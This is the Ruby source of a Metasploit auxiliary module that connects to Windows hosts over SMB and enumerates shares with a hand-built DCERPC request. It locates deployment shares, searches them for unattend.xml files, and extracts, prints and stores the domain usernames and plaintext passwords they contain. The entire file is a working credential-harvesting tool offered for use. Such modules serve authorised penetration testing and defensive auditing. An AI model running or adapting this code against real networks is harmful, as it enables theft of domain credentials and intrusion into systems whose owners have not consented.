##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/dcerpc'
require 'rex/parser/unattend'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
      'Description'    => %q{
          This module will search remote file shares for unattended installation files that may contain
          domain credentials. This is often used after discovering domain credentials with the
          auxiliary/scanner/dcerpc/windows_deployment_services module or in cases where you already
          have domain credentials. This module will connect to the RemInst share and any Microsoft
          Deployment Toolkit shares indicated by the share name comments.
      },
      'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'MSDN', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
          [ 'URL', 'http://rewtdance.blogspot.co.uk/2012/11/windows-deployment-services-clear-text.html'],
        ],
      ))

    register_options(
      [
        Opt::RPORT(445),
        OptString.new('SMBDomain', [ false, "SMB Domain", '']),
      ])

  end

  # Determine the type of share based on an ID type value
  def share_type(val)
    stypes = %W{ DISK PRINTER DEVICE IPC SPECIAL TEMPORARY }
    stypes[val] || 'UNKNOWN'
  end


  # Stolen from enumshares - Tried refactoring into simple client, but the two methods need to go in EXPLOIT::SMB and EXPLOIT::DCERPC
  # and then the lanman method calls the RPC method. Suggestions where to refactor to welcomed!
  def srvsvc_netshareenum
    shares = []
    handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', ["\\srvsvc"])

    begin
      dcerpc_bind(handle)
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error(e.message)
      return
    end

    stubdata =
      NDR.uwstring("\\\\#{rhost}") +
      NDR.long(1)  #level

    ref_id = stubdata[0,4].unpack("V")[0]
    ctr = [1, ref_id + 4 , 0, 0].pack("VVVV")

    stubdata << ctr
    stubdata << NDR.align(ctr)
    stubdata << [0xffffffff].pack("V")
    stubdata << [ref_id + 8, 0].pack("VV")

    response = dcerpc.call(0x0f, stubdata)

    # Additional error handling and validation needs to occur before
    # this code can be moved into a mixin

    res = response.dup
    win_error = res.slice!(-4, 4).unpack("V")[0]
    if win_error != 0
      fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} Win_error = #{win_error.to_i}")
    end

    # Level, CTR header, Reference ID of CTR
    res.slice!(0,12)
    share_count = res.slice!(0, 4).unpack("V")[0]

    # Reference ID of CTR1
    res.slice!(0,4)
    share_max_count = res.slice!(0, 4).unpack("V")[0]

    if share_max_count != share_count
      fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share_max_count did not match share_count")
    end

    # ReferenceID / Type / ReferenceID of Comment
    types = res.slice!(0, share_count * 12).scan(/.{12}/n).map{|a| a[4,2].unpack("v")[0]}

    share_count.times do |t|
      length, offset, max_length = res.slice!(0, 12).unpack("VVV")

      if offset != 0
        fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share offset was not zero")
      end

      if length != max_length
        fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share name max length was not length")
      end

      name = res.slice!(0, 2 * length)
      res.slice!(0,2) if length % 2 == 1 # pad

      comment_length, comment_offset, comment_max_length = res.slice!(0, 12).unpack("VVV")

      if comment_offset != 0
       fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share comment offset was not zero")
      end

      if comment_length != comment_max_length
         fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} share comment max length was not length")
      end

      comment = res.slice!(0, 2 * comment_length)
      res.slice!(0,2) if comment_length % 2 == 1 # pad

      shares << [ name, share_type(types[t]), comment]
    end

    shares
  end

  def run_host(ip)
    deploy_shares = []

    begin
      connect
      smb_login
      srvsvc_netshareenum.each do |share|
        # Ghetto unicode to ascii conversation
        share_name = share[0].unpack("v*").pack("C*").split("\x00").first
        share_comm = share[2].unpack("v*").pack("C*").split("\x00").first
        share_type = share[1]

        if share_type == "DISK" && (share_name == "REMINST" || share_comm == "MDT Deployment Share")
          vprint_good("Identified deployment share #{share_name} #{share_comm}")
          deploy_shares << share_name
        end
      end

      deploy_shares.each do |deploy_share|
        query_share(deploy_share)
      end

    rescue ::Interrupt
      raise $!
    end
  end

  def query_share(share)
    share_path = "\\\\#{rhost}\\#{share}"
    vprint_status("Enumerating #{share}...")

    begin
      simple.connect(share_path)
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error("Could not access share: #{share} - #{e}")
      return
    end

    results = simple.client.file_search("\\", /unattend.xml$/i, 10)

    results.each do |file_path|
      file = simple.open(file_path, 'o').read()
      next unless file

      loot_unattend(file)

      creds = parse_client_unattend(file)
      creds.each do |cred|
        next unless (cred && cred['username'] && cred['password'])
        next unless cred['username'].to_s.length > 0
        next unless cred['password'].to_s.length > 0

        report_creds(cred['domain'].to_s, cred['username'], cred['password'])
        print_good("Credentials: " +
          "Path=#{share_path}#{file_path} " +
          "Username=#{cred['domain'].to_s}\\#{cred['username'].to_s} " +
          "Password=#{cred['password'].to_s}"
        )
      end
    end

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def parse_client_unattend(data)

    begin
      xml = REXML::Document.new(data)
    rescue REXML::ParseException => e
      print_error("Invalid XML format")
      vprint_line(e.message)
    end
    Rex::Parser::Unattend.parse(xml).flatten
  end

  def loot_unattend(data)
    return if data.empty?
    path = store_loot('windows.unattend.raw', 'text/plain', rhost, data, "Windows Deployment Services")
    print_good("Stored unattend.xml in #{path}")
  end

  def report_creds(domain, user, pass)
    report_cred(
      ip: rhost,
      port: 445,
      service_name: 'smb',
      user: "#{domain}\\#{user}",
      password: pass,
      proof: domain
    )
  end
end

